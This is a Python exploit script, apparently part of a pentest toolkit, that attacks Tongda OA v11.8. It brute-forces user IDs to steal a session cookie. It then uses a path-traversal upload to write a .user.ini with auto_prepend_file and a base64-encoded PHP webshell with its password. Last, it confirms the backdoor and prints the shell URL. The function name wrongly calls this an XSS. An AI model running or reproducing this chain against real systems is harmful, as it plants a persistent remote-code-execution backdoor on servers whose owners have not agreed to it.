import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import re
import base64
from concurrent.futures import ThreadPoolExecutor

proxies={'http':'http://127.0.0.1:8080'}
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360',
}

def Target_URL(target_url,i):
    url = target_url + 'mobile/auth_mobi.php?isAvatar=1&uid={}&P_VER=0'
    manage = target_url + "general/"
    url = target_url + 'mobile/auth_mobi.php?isAvatar=1&uid={}&P_VER=0'.format(i)
    response = requests.get(url=url, headers=headers, verify=False)
    if response.status_code == 200 and response.text == "":
        pattern = re.findall(r'PHPSESSID=(.*?);', str(response.headers))
        cookie = "PHPSESSID={}".format(pattern[0])
        return cookie


def POC_2(target_url, Cookie):
    vuln_url = target_url + "/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/test"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie": Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    data = base64.b64decode(
        'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmxvZyIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgo8P3BocAplY2hvICdpdCB3b3JrJzsKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7CgkkX1NFU1NJT05bJ2snXT0ka2V5OwoJc2Vzc2lvbl93cml0ZV9jbG9zZSgpOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGVjb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgoJCWZvcigkaT0wOyRpPHN0cmxlbigkcG9zdCk7JGkrKykgewogICAgCQkJICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOwogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHBsb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kYXJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmFsKCRwLiIiKTt9fQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7Cj8+Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzdWJtaXQiCgrmj5DkuqQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNC0t')
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        if "档案已保存" in response.text and response.status_code == 200:
            print(Vcolors.RED + '[+] 成功上传test.log' +Vcolors.ENDC)
            POC_3(target_url, Cookie)
        else:
            print(Vcolors.WARNING +"[x] 上传test.log失败漏洞不存在" +Vcolors.ENDC)

    except:
        print(Vcolors.WARNING + "[x] 无法利用poc2请求目标或被目标拒绝请求" +Vcolors.ENDC)


def POC_3(target_url, Cookie):
    payload = 'general/reportshop/workshop/report/attachment-remark/form.inc.php'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Cookie": Cookie,
    }
    try:
        res = requests.get(url=target_url + payload, headers=headers, timeout=5, verify=False)
        if res.status_code == 200 and 'it work' in res.text:
            print(Vcolors.RED +"[+] 存在漏洞，成功上传冰蝎三Shell, 密码为: rebeyond:{}".format(target_url + payload)+ Vcolors.ENDC)
        else:
            print(Vcolors.WARNING +"[x] 不存在漏洞，或请稍等连接木马:{}".format(target_url+payload)+Vcolors.ENDC)
    except:
        print(Vcolors.WARNING + "[x] 无法利用poc3请求目标或被目标拒绝请求"+Vcolors.ENDC)


def 通达OA_v11_8_后台包含xss(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    Cookie=''
    for i in range(1, 1000):
        pool = ThreadPoolExecutor(max_workers=60)
        future1 = pool.submit(Target_URL, urldata,i)
        if future1.result() != None:
            Cookie=future1.result()
            break
        else:
            print(Vcolors.WARNING + "[x] 通达OA v11.8 后台文件包含漏洞利用失败，未能获取Cookie" +Vcolors.ENDC)
            exit()

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "multipart/form-data; boundary=---------------------------17518323986548992951984057104",
        "Connection": "close",
        "Cookie": Cookie,
        "Upgrade-Insecure-Requests": "1",
    }
    vuln_url = urldata + "general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\workshop/report/attachment-remark/.user"
    data = base64.b64decode( 'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0iMTExMTExLmluaSIKQ29udGVudC1UeXBlOiB0ZXh0L3BsYWluCgphdXRvX3ByZXBlbmRfZmlsZT0xMTExMTEubG9nCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJzdWJtaXQiCgrmj5DkuqQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNC0t')
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5,proxies=proxies)
        if "档案已保存" in response.text and response.status_code == 200:
            print(Vcolors.RED + "[+] 成功上传usr.ini" +Vcolors.ENDC)
            POC_2(urldata, Cookie)
        else:
            print(Vcolors.WARNING+"[x] 上传usr.ini失败漏洞不存在" + Vcolors.ENDC)
    except:
        logging.error("通达OA_v11_8_后台包含xss脚本出现异常")


